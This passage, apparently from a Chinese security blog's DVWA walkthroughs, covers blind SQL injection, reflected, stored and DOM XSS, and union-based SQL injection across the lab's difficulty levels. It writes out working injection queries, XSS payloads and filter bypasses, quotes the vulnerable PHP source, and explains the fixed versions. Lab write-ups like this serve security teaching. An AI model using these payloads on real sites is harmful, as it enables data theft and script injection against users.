database.说明数据库名第一个字母ascii为100，即d。同理可以知道数据库名为dvwa。 表的数量123id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=1 %23 显示不存在id=1&apos; and (select count (table_name) from information_schema.tables where table_schema=database())=2 %23 显示存在 id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 %23显示User ID exists in the database.说明第一个数据表的第一个字母ascii为103，同理可以得到这个表的名字和下一个表users的名字。 2.手动二分法猜解 库名1234567891011id=1&apos; and ascii(substr(databse(),1,1))&gt;97 %23 ，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；id=1&apos; and ascii(substr(databse(),1,1))&lt;122 %23，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；id=1&apos; and ascii(substr(databse(),1,1))&lt;109 %23，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；id=1&apos; and ascii(substr(databse(),1,1))&lt;103 %23，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；id=1&apos; and ascii(substr(databse(),1,1))&lt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；id=1&apos; and ascii(substr(databse(),1,1))&gt;100 %23，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。 表名123456789id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 %23 显示存在id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 %23 显示存在id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 %23 显示存在id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 %23 显示不存在id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 %23 显示不存在 3.基于时间的盲注 id=1&#39; and sleep(5)%23 有延迟id=1 and sleep(5)%23 没有延迟说明存在字符型的基于时间的盲注。 猜数据库名的长度12id=1&apos; and if(length(database())=1,sleep(5),1)%23 没有延迟id=1&apos; and if(length(database())=4,sleep(5),1)%23 有延迟 说明库名长度为4 二分法猜解库名12345id=1&apos; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)%23有延迟···1&apos; and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1&apos; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟 库名第一个字母ascii为100 同理可以猜出表的个数 长度 名字以及列和数据。 源码：1234567891011121314151617181920212223242526&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;// Get input$id = $_GET[ &apos;id&apos; ];// Check database$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors// Get results$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errorsif( $num &gt; 0 ) &#123;// Feedback for end userecho &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;&#125;else &#123;// User wasn&apos;t found, so the page wasn&apos;t!header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );// Feedback for end userecho &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 根据源码，发现id没有经过任何过滤就被放入sql语句。如果查询返回的结果数大于0就显示&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;，否则&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt; Medium难度变成了下拉选项，查看源码参数名为id且为post方式。hackbar或者burp抓包改参数即可 123id=1&apos; and 1=1报错id=1 and 1=1正确id=1 and 1=0报错 说明为数字型。 其余方法和low难度大同小异 布尔盲注：12345id=1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；id=1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；id=1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。 时间盲注：12345id=1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；id=1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；id=1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。 源码：123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;// Get input$id = $_POST[ &apos;id&apos; ];$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Check database$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors// Get results$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errorsif( $num &gt; 0 ) &#123;// Feedback for end userecho &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;&#125;else &#123;// Feedback for end userecho &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;&#125;//mysql_close();&#125;?&gt; 与low难度相比多了一个mysqli_real_escape_string函数转义，但是这里的参数是数字型，不需要单引号双引号去闭合，加不加这个函数效果一样。 High难度在另外一个页面填写参数结果显示到该页面。 1234id=1&apos; and 1=1#正确id=1&apos; and 1=0#错误id=1 and 1=1#正确id=1 and 1=0#正确 所以是单引号闭合 另外有时候显示错误的时候，页面会延迟一会。所以智能用布尔盲注。方法与前两个难度大同小异。 源码：12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_COOKIE[ &apos;id&apos; ] ) ) &#123;// Get input$id = $_COOKIE[ &apos;id&apos; ];// Check database$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors// Get results$num = @mysqli_num_rows( $result ); // The &apos;@&apos; character suppresses errorsif( $num &gt; 0 ) &#123;// Feedback for end userecho &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;&#125;else &#123;// Might sleep a random amountif( rand( 0, 5 ) == 3 ) &#123;sleep( rand( 2, 4 ) );&#125;// User wasn&apos;t found, so the page wasn&apos;t!header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );// Feedback for end userecho &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 用COOKIE传递参数id，并且没有任何过滤，SQL语句后面加了一个limit 1限制返回的结果数为1。另外如果查询的结果数&lt;=01234if( rand( 0, 5 ) == 3 )&#123;sleep( rand( 2, 4 ) );&#125; 该代码的意思是，在0-5随机生成一个随机整数数，如果该随机数等于3，就执行sleep(2,4)随机延迟2到4秒。所以不能用时间盲注，只能用布尔盲注。不过如果把时间盲注响应时间延长一点也是可以判断的，但是会很麻烦. Impossible难度源码：123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$id = $_GET[ &apos;id&apos; ];// Was a number entered?if(is_numeric( $id )) &#123;// Check the database$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );$data-&gt;execute();// Get resultsif( $data-&gt;rowCount() == 1 ) &#123;// Feedback for end userecho &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;&#125;else &#123;// User wasn&apos;t found, so the page wasn&apos;t!header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; );// Feedback for end userecho &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;&#125;&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 加入token机制防止CSRF，仍然使用PDO预处理语句划清了数据与代码的界限，杜绝了SQL注入。 参考文献:新手指南：DVWA-1.9全级别教程之SQL Injection(Blind) 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（五）XSS]]></title>
    <url>%2F2018%2F05%2F18%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89XSS%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（五）XSS 简介XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。 根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 Reflected Cross Site Scripting (反射型XSS)LOW级别输入的数据会显示在当前页面中，尝试输name=aaaa&lt;&gt;&#39;/&quot;发现没有任何过滤 1name=&lt;script&gt;alert(1)&lt;/script&gt; 1name=&lt;img src=1 onerror=alert(1)&gt; 源码：12345678&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;// Feedback for end userecho &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; array_key_exists检查数组中是否有指定的键名传入的name参数没有任何过滤就输出到页面上。 Medium难度1name=aaaa&lt;&gt;&apos;/&quot;,发现没有过滤&lt;&gt;&apos;/&quot;。 尝试插入JS语句name=&lt;script&gt;alert(1)&lt;/script&gt;没有弹窗查看源码，&lt;script&gt; 被过滤了。 尝试用大小写绕过 **&lt;script/&gt;**也可以绕过 双写&lt;script&gt;绕过 过滤了script可以用img标签 body标签 iframe标签 input标签 还有很多。 源码：1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;// Get input$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );// Feedback for end userecho &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 只过滤了&lt;script&gt;。 High难度同样没有过滤aaaa&lt;&gt;&#39;/&quot; name=&lt;script&gt;alert(1)&lt;/script&gt;就剩下了个&gt; 用img标签 同样可以用iframe和body等标签。 源码1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;// Get input$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );// Feedback for end userecho &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 源码把&lt;script&gt;替换为空. impossible级别源码：12345678910111213141516&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end userecho &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。 存储型XSSLOW级别输入测试数据 aaa&lt;&gt;&quot;/&#39; 查看源代码发现没有任何过滤 但是name限制输入字符为10个,可以用hackbar改包1txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/xss/)&lt;/script&gt; 查看源代码 源码： 1234567891011121314151617181920&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;// Get input$message = trim( $_POST[ &apos;mtxMessage&apos; ] );$name = trim( $_POST[ &apos;txtName&apos; ] );// Sanitize message input$message = stripslashes( $message );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Sanitize name input$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Update database$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );//mysql_close();&#125;?&gt; trim函数去掉字符序列左边和右边的空格。stripslashes函数删除message中的反斜杠。mysqli_real_escape_string函数转义name和message中的\x00 ，\n，\r，\ ， &#39;，&quot; ， \x1a没有做XSS方面的过滤与检查，并且存储在数据库中，所以存在出存储型XSS。 Medium难度同样输入txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/\xss/)&lt;/script&gt;前者被过滤了&lt;script&gt;，后者script标签都被过滤 尝试大小写script绕过，name成功弹窗，message仍然过滤 源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;// Get input$message = trim( $_POST[ &apos;mtxMessage&apos; ] );$name = trim( $_POST[ &apos;txtName&apos; ] );// Sanitize message input$message = strip_tags( addslashes( $message ) );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$message = htmlspecialchars( $message );// Sanitize name input$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Update database$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );//mysql_close();&#125;?&gt; strip_tags函数剥去字符串中的 HTML 标签。但是仍然可以使用标签addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。message参数使用了htmlspecialchars函数进行HTML编码，无法注入XSS代码。 High难度源码：12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;// Get input$message = trim( $_POST[ &apos;mtxMessage&apos; ] );$name = trim( $_POST[ &apos;txtName&apos; ] );// Sanitize message input$message = strip_tags( addslashes( $message ) );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$message = htmlspecialchars( $message );// Sanitize name input$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));// Update database$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );//mysql_close();&#125;?&gt; name过滤了&lt;script,使用其他标签如iframe即可。 源码1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$message = trim( $_POST[ &apos;mtxMessage&apos; ] );$name = trim( $_POST[ &apos;txtName&apos; ] );// Sanitize message input$message = stripslashes( $message );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$message = htmlspecialchars( $message );// Sanitize name input$name = stripslashes( $name );$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$name = htmlspecialchars( $name );// Update database$data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );$data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );$data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );$data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 采用了token机制防止CSRF攻击，对name和message都采用htmlspecialchars函数编码防止XSS，sql语句用pdo对象防止SQL注入。 DOM型XSSLOW级别是个下拉框，不过可以抓包改参数 查看源代码 indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。substring() 方法用于提取字符串中介于两个指定下标之间的字符。1document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); default=后面的参数变成了该语句中的lang,也就是：&lt;option value=&quot;lang&quot;&gt;decodeURI(lang)&lt;/option&gt; 同样可以闭合前面的option标签和select标签 medium级别PHP源码：1234567891011&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;$default = $_GET[&apos;default&apos;];# Do not allow script tagsif (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;header (&quot;location: ?default=English&quot;);exit;&#125;&#125;?&gt; stripos,查找 “第二个参数” 在第一个参数中第一次出现的位置。也就是说过滤了&lt;script 绕过方法1：url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为1default=&lt;script&gt;alert(/xss/)&lt;/script&gt; 绕过方法2： 用img，iframe，body，svg等标签的特性去执行JS代码。 high级别源码：123456789101112131415161718&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;# White list the allowable languagesswitch ($_GET[&apos;default&apos;]) &#123;case &quot;French&quot;:case &quot;English&quot;:case &quot;German&quot;:case &quot;Spanish&quot;:# okbreak;default:header (&quot;location: ?default=English&quot;);exit;&#125;&#125;?&gt; 限定了键名必须为default，键值必须为固定的4个值。 所以这里只能用#绕过服务器检测 impossible级别 把decodeuri变成了一个简单的括号，js是从URL中获得的lang参数并不会对他进行解码。所以无法构造XSS代码。 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>CTF</category>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习（三）SQL Injection]]></title>
    <url>%2F2018%2F05%2F12%2FDVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89SQL-Injection%2F</url>
    <content type="text"><![CDATA[引言DVWA学习（三）SQL Injection 简介SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。 LOW级别输入1 输入1’报错，可以知道这里的ID是单引号闭合1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1 输入1’ or 1=’1显示了所有姓名和ID，可以知道是用了while循环显示 输入id=1&#39; union select 1-- k&amp;Submit=Submit报错The used SELECT statements have a different number of columns输入id=1&#39; union select 1,2-- k&amp;Submit=Submit正常显示,1,2号位也正常显示出来 爆数据库 id=1&#39; union select 1,database()-- k&amp;Submit=Submit 2号位显示数据库名为dvwa 爆表 id=1&#39; union select 1,group_concat(0x3e,table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; -- k&amp;Submit=Submit 爆列 1id=1&apos; union select 1,group_concat(0x3e,column_name) from information_schema.columns where table_schema=&apos;dvwa&apos; -- k&amp;Submit=Submit 爆出所有用户名和密码 源码： 1234567891011121314151617181920212223&lt;?phpif( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123;// Get input$id = $_REQUEST[ &apos;id&apos; ];// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );// Get resultswhile( $row = mysqli_fetch_assoc( $result ) ) &#123;// Get values$first = $row[&quot;first_name&quot;];$last = $row[&quot;last_name&quot;];// Feedback for end userecho &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;&#125;mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 没有任何过滤，最基本的SQL注入 Medium级别变成了下拉框 可以查看元素知道name=id，post表单，可以用burp抓包改id或者用hackbar。 id=1&#39;发现单引号被转义了 id=1 or 1=1&amp;Submit=Submit显示所有ID和姓名，可以判断是数字型。 其余方法和LOW难度一样 源码：123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;// Get input$id = $_POST[ &apos;id&apos; ];$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );// Get resultswhile( $row = mysqli_fetch_assoc( $result ) ) &#123;// Display values$first = $row[&quot;first_name&quot;];$last = $row[&quot;last_name&quot;];// Feedback for end userecho &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;&#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; 与LOW相比仅仅加了一个mysqli_real_escape_string函数转义\x00，\n，\r，\，&#39;，&quot;，\x1a。单引号闭合变成了数字型。 High难度变成了在另外一个窗口提交ID到该页面 其余步骤和上面差不多 High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 源码： 12345678910111213141516171819202122&lt;?phpif( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123;// Get input$id = $_SESSION[ &apos;id&apos; ];// Check database$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );// Get resultswhile( $row = mysqli_fetch_assoc( $result ) ) &#123;// Get values$first = $row[&quot;first_name&quot;];$last = $row[&quot;last_name&quot;];// Feedback for end userecho &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;&#125;((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 与Medium难度相比High难度没有转义函数，在SQL语句后面添加了一个limit，限制输出结果为1条。虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。安全代码 Impossible难度 源码：1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$id = $_GET[ &apos;id&apos; ];// Was a number entered?if(is_numeric( $id )) &#123;// Check the database$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );$data-&gt;execute();$row = $data-&gt;fetch();// Make sure only 1 result is returnedif( $data-&gt;rowCount() == 1 ) &#123;// Get values$first = $row[ 